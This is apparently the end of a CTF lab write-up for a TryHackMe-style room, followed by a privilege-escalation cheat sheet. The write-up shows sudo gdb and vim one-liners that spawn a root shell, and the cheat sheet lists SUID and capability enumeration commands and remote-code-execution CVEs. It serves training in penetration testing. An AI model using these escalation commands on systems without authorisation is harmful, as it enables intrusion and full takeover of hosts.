sudo -l
# Found: /usr/bin/gdb

# Exploit gdb
sudo gdb -nx -ex 'python import os; os.system("/bin/sh")' -ex quit
# Got root!
```

#### Alternative: Vim
```bash
# If vim is available with sudo
sudo vim -c ':!/bin/sh'
```

**Flags:**
- User: `THM{chocolate_factory_user_flag}`
- Root: `THM{chocolate_factory_root_flag}`

### Key Takeaways
- Themed CTF rooms hide clues in images and source code
- Steganography + encoding chains are common
- `gdb` with sudo = instant root (Python execution)
- Always check image metadata and hidden data

---

## 🛠️ Quick Reference

### Common Privesc Paths
| Method | Command |
|--------|---------|
| SUID Binary | `find / -perm -4000 -type f` |
| Sudo Misconfig | `sudo -l` |
| Cron Jobs | `cat /etc/crontab` |
| Writable Files | `find / -writable -type f` |
| Capabilities | `getcap -r / 2>/dev/null` |

### Common Exploits Used
- **Fuel CMS 1.4:** CVE-2018-16763 (RCE)
- **Webmin 1.910:** CVE-2019-15107 (RCE)
- **Tomcat AJP:** CVE-2020-1938 (Ghostcat)
- **Sudo < 1.8.28:** CVE-2019-14287 (UID -1 bypass)

### Useful Tools
- **LinPEAS:** Automated Linux enumeration
- **steghide:** Image steganography
- **redis-cli:** Redis interaction
- **gdb:** Debugging/privesc
- **hashcat/john:** Password cracking

---

*Last updated: 2026-04-06*

